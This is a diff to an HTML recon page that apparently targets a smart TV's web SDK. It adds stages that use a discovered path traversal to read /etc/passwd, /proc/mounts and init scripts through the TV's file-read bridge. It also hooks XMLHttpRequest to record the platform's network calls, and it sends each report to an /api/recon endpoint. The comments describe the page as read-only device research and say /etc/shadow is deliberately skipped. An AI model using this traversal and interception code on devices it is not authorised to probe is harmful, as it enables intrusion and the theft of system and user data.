@@ -1,8 +1,9 @@
 <!doctype html>
-<!-- Recon ladder v1+v2 for 55E7QTUK / V0000.09.09D.P1001 (2026-11-08).
+<!-- Recon ladder v1..v4 for 55E7QTUK / V0000.09.09D.P1001 (2026-11-08).
      Adapted from launcher/recon-55.html (09.09O.AU v1-v4). Staged POSTs to
-     /api/recon (full report each stage, last-writer-wins). Read-only: every
-     probe is a fileRead; nothing is written to the TV.
+     /api/recon (full report each stage, last-writer-wins). Read-only: probes
+     are fileReads and the XHR patch is local-capture only; nothing is written
+     to the TV. /etc/shadow is deliberately not dumped.
      Shape note for this build: hiutils results are {ret:bool, msg:string|object};
      on failures msg is a Node errno object ({errno,code,syscall,path}) — the
      resolved absolute path lives in msg.path, so this page keeps the RAW
@@ -108,5 +109,61 @@
 
   try { v1(); } catch (e) { report.v1.fatal = String(e); save("v1-fatal"); }
   setTimeout(function () { try { v2(); } catch (e) { report.v2.fatal = String(e); save("v2-fatal"); } }, 2000);
+
+  // ---------- v3: dumps (read-only; shadow NOT dumped) ----------
+  var DUMPS = ["proc/mounts", "etc/inittab", "etc/passwd",
+               "etc/init.d/rcS", "etc/rc.local", "etc/profile"];
+  function v3() {
+    if (P === null) { report.v3.skipped = "no traversal found in v2"; save("v3"); return; }
+    report.v3 = { prefix: P, dumps: {} };
+    for (var i = 0; i < DUMPS.length; i++) {
+      var r = rd(P + DUMPS[i]);
+      report.v3.dumps[DUMPS[i]] = { path: P + DUMPS[i], ok: !!r.ok, ret: r.ret,
+                                    body: r.ok ? r.msgRaw : null,
+                                    err: r.ok ? null : r.msgRaw };
+      line("v3: " + DUMPS[i] + (r.ok ? " ok(" + r.msgRaw.length + "b)" : " fail " + trunc(r.msgRaw, 100)));
+    }
+    save("v3");
+  }
+
+  // ---------- v4: wire capture + self procs ----------
+  var wire = [];
+  function v4() {
+    try {
+      var o = XMLHttpRequest.prototype.open, s = XMLHttpRequest.prototype.send;
+      XMLHttpRequest.prototype.open = function (m, u) {
+        this.__alv = { m: m, u: String(u) };
+        return o.apply(this, arguments);
+      };
+      XMLHttpRequest.prototype.send = function (b) {
+        if (this.__alv && this.__alv.u.indexOf("/api/recon") === -1) {
+          wire.push({ m: this.__alv.m, u: trunc(this.__alv.u, 300),
+                      body: trunc((b == null ? null : (typeof b === "string" ? b : "(binary)")), 4000) });
+        }
+        return s.apply(this, arguments);
+      };
+      report.v4.patched = true;
+    } catch (e) { report.v4.patch_error = String(e); }
+    // stir the bridge so the XHR hook sees a live call
+    var stir = rd("websdk/Appinfo.json");
+    report.v4.stir_ok = !!stir.ok;
+    setTimeout(function () {
+      report.v4.wire = wire;
+      var pre = (P === null ? "" : P);
+      report.v4.self_cmdline = rd(pre + "proc/self/cmdline");
+      report.v4.self_status = rd(pre + "proc/self/status");
+      report.v4.cmdline = report.v4.self_cmdline.ok ? report.v4.self_cmdline.msgRaw
+                                                    : ("FAIL " + report.v4.self_cmdline.msgRaw);
+      report.v4.status = report.v4.self_status.ok ? report.v4.self_status.msgRaw
+                                                  : ("FAIL " + report.v4.self_status.msgRaw);
+      line("v4: wire=" + wire.length + " cmdline.ok=" + !!report.v4.self_cmdline.ok +
+           " status.ok=" + !!report.v4.self_status.ok);
+      save("v4");
+      save("end");
+    }, 2600);
+  }
+
+  setTimeout(function () { try { v3(); } catch (e) { report.v3.fatal = String(e); save("v3-fatal"); } }, 4500);
+  setTimeout(v4, 6500);
 })();
 </script></body></html>
